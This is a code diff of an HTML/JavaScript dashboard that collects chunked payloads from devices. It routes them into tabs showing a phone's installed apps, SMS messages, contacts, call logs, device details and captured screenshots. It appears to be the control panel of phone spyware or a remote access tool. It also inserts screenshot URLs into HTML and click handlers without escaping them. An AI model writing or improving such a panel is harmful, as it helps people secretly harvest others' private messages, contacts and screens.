-              pushLog(`🔁 Received chunk ${idx}/${total} for ${tag} (${entry.received}/${entry.total})`);
+              pushLog(`⏳ Assembled ${have}/${tot} chunks for ${deviceTag}`);
             }
           } else {
-            // not chunked — try parse directly (or maybe contains JSON string)
-            handleAssembledPayload(raw);
+            // not chunked: try to parse directly
+            handleFullPayload(raw.trim());
           }
         }
       } catch (e) {
@@ -534,66 +377,205 @@
       }
     };
 
-    // called when we have a complete payload (either single message or assembled)
-    function handleAssembledPayload(text) {
-      // trim and attempt to extract JSON body if wrapped or prefixed
-      const trimmed = text.trim();
-      // try direct JSON parse
-      const parsed = tryParseJSON(trimmed);
-      if (parsed !== null) {
-        const routed = routeParsedPayload(parsed);
-        if (!routed) pushLog("ℹ️ Parsed JSON but could not route automatically.");
-        return;
-      }
-
-      // sometimes payload may contain lines with metadata and then JSON — try to locate first "{" or "[" 
-      const idxObj = trimmed.indexOf("{");
-      const idxArr = trimmed.indexOf("[");
-      let pick = -1;
-      if (idxObj === -1) pick = idxArr;
-      else if (idxArr === -1) pick = idxObj;
-      else pick = Math.min(idxObj, idxArr);
-
-      if (pick !== -1) {
-        const possible = trimmed.substring(pick);
-        const parsed2 = tryParseJSON(possible);
-        if (parsed2 !== null) {
-          const routed2 = routeParsedPayload(parsed2);
-          if (!routed2) pushLog("ℹ️ Parsed JSON after trimming metadata but not routed.");
-          return;
-        }
-      }
-
-      // If not JSON, display raw text in logs and also search for supabase URL (screenshots)
-      if (trimmed.includes("supabase.co") || trimmed.match(/^https?:\/\/.+\.(jpg|png|jpeg|webp)/i)) {
-        // find URLs (very simple regex)
-        const urlRegex = /(https?:\/\/\S+\.(?:png|jpe?g|webp|gif|svg|bin|jpg))(?:\s|$)/ig;
-        const urls = [];
-        let mm;
-        while ((mm = urlRegex.exec(trimmed)) !== null) urls.push(mm[1]);
-        if (urls.length) { renderScreenshots(urls); showTab("screenshots"); return; }
-      }
-
-      // fallback — append to logs
-      pushLog("📄 " + trimmed);
+    function shorten(s, n = 120) {
+      if (!s) return '';
+      return s.length > n ? s.slice(0,n) + '…' : s;
     }
 
-    // cleanup old chunk entries periodically (in case some never complete)
-    setInterval(() => {
-      const now = Date.now();
-      for (const [k, v] of chunkBuffer) {
-        if (now - v.lastTs > 60_000) { // 60s
-          chunkBuffer.delete(k);
-          pushLog("⚠️ Discarded incomplete chunk buffer: " + k);
+    // --- payload processing: try to detect JSON arrays/objects and route to correct tab ---
+    function handleFullPayload(payload) {
+      // payload might include log text + a JSON snippet; attempt to find the JSON start
+      // trim known leading/trailing whitespace
+      const p = payload.trim();
+
+      // Try parse as JSON directly if it starts with { or [
+      if (p.startsWith("{") || p.startsWith("[")) {
+        try {
+          const parsed = JSON.parse(p);
+          handleParsedObject(parsed);
+          return;
+        } catch (err) {
+          // not valid JSON -> fall-through to log display
         }
       }
-    }, 15_000);
 
-    // expose pushRemoteLog
+      // Sometimes device sends "Received object payload: {...}" or other prefixes.
+      // Try to extract the first {...} or [...] sequence
+      const jsonMatch = p.match(/(\{[\s\S]*\}|\[[\s\S]*\])/);
+      if (jsonMatch) {
+        try {
+          const parsed = JSON.parse(jsonMatch[1]);
+          handleParsedObject(parsed);
+          return;
+        } catch (err) {
+          // fall through
+        }
+      }
+
+      // Otherwise just display in logs
+      pushLog(`📥 ${p}`);
+    }
+
+    // Inspect parsed JSON and route
+    function handleParsedObject(obj) {
+      if (Array.isArray(obj)) {
+        // Heuristics: arrays of objects -> apps, sms, contacts, calls
+        if (obj.length === 0) {
+          pushLog("⚠️ Received empty array");
+          return;
+        }
+        // check keys of first item to decide
+        const keys = Object.keys(obj[0]).map(k => k.toLowerCase()).join(' ');
+        if (keys.includes('package') || keys.includes('packageName') || keys.includes('app')) {
+          renderApps(obj);
+          setActiveTab('apps');
+          return;
+        }
+        if (keys.includes('address') || keys.includes('body') || keys.includes('date') || keys.includes('sms')) {
+          renderSms(obj);
+          setActiveTab('sms');
+          return;
+        }
+        if (keys.includes('name') && keys.includes('phone')) {
+          renderContacts(obj);
+          setActiveTab('contacts');
+          return;
+        }
+        if (keys.includes('number') || keys.includes('duration') || keys.includes('type')) {
+          renderCalls(obj);
+          setActiveTab('calls');
+          return;
+        }
+        // fallback: show as apps
+        renderApps(obj);
+        setActiveTab('apps');
+        return;
+      } else if (typeof obj === 'object') {
+        // Treat as device info if many simple key/values
+        renderDeviceInfo(obj);
+        setActiveTab('device');
+        return;
+      } else {
+        // fallback
+        pushLog("📥 Received: " + String(obj));
+      }
+    }
+
+    // --- Renderers ---
+    function renderApps(arr) {
+      appsLoading.textContent = `Showing ${arr.length} apps`;
+      appsList.innerHTML = '';
+      arr.forEach((a, i) => {
+        // expect either string or object
+        let title = typeof a === 'string' ? a : (a.package || a.packageName || a.app || a.label || a.name || JSON.stringify(a));
+        const li = document.createElement('li'); li.className = 'item';
+        li.innerHTML = `<div style="max-width:75%"><div style="font-weight:700;color:#dbefff">${escapeHtml(title)}</div><div class="muted" style="font-size:12px">${escapeHtml(a.version || a.versionName || '')}</div></div><div class="muted">${i+1}</div>`;
+        appsList.appendChild(li);
+      });
+    }
+
+    function renderSms(arr) {
+      smsLoading.textContent = `Showing ${arr.length} SMS`;
+      smsList.innerHTML = '';
+      arr.forEach((s) => {
+        const who = s.address || s.from || s.sender || s.number || 'unknown';
+        const body = s.body || s.message || JSON.stringify(s);
+        const time = s.date || s.time || '';
+        const li = document.createElement('li'); li.className='item';
+        li.innerHTML = `<div><div style="font-weight:700">${escapeHtml(who)}</div><div class="muted" style="font-size:13px">${escapeHtml(body)}</div></div><div class="muted">${escapeHtml(time)}</div>`;
+        smsList.appendChild(li);
+      });
+    }
+
+    function renderContacts(arr) {
+      contactsLoading.textContent = `Showing ${arr.length} contacts`;
+      contactsList.innerHTML = '';
+      arr.forEach(c => {
+        const name = c.name || c.displayName || c.title || 'Unknown';
+        const phone = c.phone || c.number || (c.phones && c.phones[0]) || '';
+        const li = document.createElement('li'); li.className='item';
+        li.innerHTML = `<div><div style="font-weight:700">${escapeHtml(name)}</div><div class="muted">${escapeHtml(phone)}</div></div>`;
+        contactsList.appendChild(li);
+      });
+    }
+
+    function renderCalls(arr) {
+      callsLoading.textContent = `Showing ${arr.length} calls`;
+      callsList.innerHTML = '';
+      arr.forEach(c => {
+        const number = c.number || c.phone || c.caller || 'unknown';
+        const type = c.type || c.callType || '';
+        const dur = c.duration || c.dur || '';
+        const time = c.date || c.time || '';
+        const li = document.createElement('li'); li.className='item';
+        li.innerHTML = `<div><div style="font-weight:700">${escapeHtml(number)} <span class="muted" style="font-weight:600"> ${escapeHtml(type)}</span></div><div class="muted">${escapeHtml(time)} • ${escapeHtml(dur)}</div></div>`;
+        callsList.appendChild(li);
+      });
+    }
+
+    function renderDeviceInfo(obj) {
+      deviceLoading.textContent = 'Device info received';
+      deviceTable.innerHTML = '';
+      for (const k of Object.keys(obj)) {
+        const tr = document.createElement('tr');
+        const keyTd = document.createElement('td'); keyTd.style.width = '40%'; keyTd.innerHTML = `<strong>${escapeHtml(k)}</strong>`;
+        const valTd = document.createElement('td'); valTd.innerText = formatValue(obj[k]);
+        tr.appendChild(keyTd); tr.appendChild(valTd);
+        deviceTable.appendChild(tr);
+      }
+    }
+
+    // screenshots handling (supabase URLs)
+    function handlePossibleScreenshotOutput(text) {
+      const urlMatch = text.match(/https?:\/\/[^\s]+supabase\.co[^\s"]+/i);
+      if (urlMatch) {
+        const url = urlMatch[0];
+        const d = new Date();
+        const stamp = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()} ${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}`;
+        const item = document.createElement('div'); item.className = 'shot';
+        item.innerHTML = `<div class="metaSmall">Captured: ${stamp}</div><img src="${url}" alt="shot"><div style="display:flex;gap:8px;margin-top:8px"><button class="btn ghost" onclick="downloadUrl('${url}', 'screenshot_${stamp.replace(/[^0-9]/g,'_')}.jpg')">Download</button><button class="btn ghost" onclick="window.open('${url}','_blank')">Open</button></div>`;
+        screenshotsContainer.prepend(item);
+      }
+    }
+
+    function downloadUrl(url, filename) {
+      fetch(url).then(r => r.blob()).then(blob => {
+        const blobUrl = URL.createObjectURL(blob);
+        const a = document.createElement('a'); a.href = blobUrl; a.download = filename; document.body.appendChild(a); a.click(); a.remove();
+        URL.revokeObjectURL(blobUrl);
+      }).catch(e => pushLog('Download failed: ' + e.message));
+    }
+
+    // helpers
+    function formatValue(v) {
+      if (v === null || v === undefined) return '';
+      if (typeof v === 'object') return JSON.stringify(v);
+      return String(v);
+    }
+    function escapeHtml(s) {
+      if (!s && s !== 0) return '';
+      return String(s).replace(/[&<>"]/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[ch]));
+    }
+
+    // If a parsed JSON isn't recognized, also try to extract screenshot URLs
+    function fallbackProcessParsed(parsed, raw) {
+      try { handlePossibleScreenshotOutput(raw); } catch (e) {}
+      pushLog("📥 Unrecognized JSON payload (logged).");
+    }
+
+    // when non-json arrives, still check screenshots and log
+    function handleTextPayload(text) {
+      handlePossibleScreenshotOutput(text);
+    }
+
+    // high-level handler fallback: if handleParsedObject didn't display something, fallback to log + screenshot detection
+    // (we already call handleFullPayload -> handleParsedObject so we only need to check screenshot in non-json branches)
+
+    // Expose pushRemoteLog for external scripts if needed
     window.pushRemoteLog = pushLog;
 
-    // Good initial UI state
-    showTab("logs");
+    // initial tab
+    setActiveTab('logs');
   </script>
 </body>
 </html>
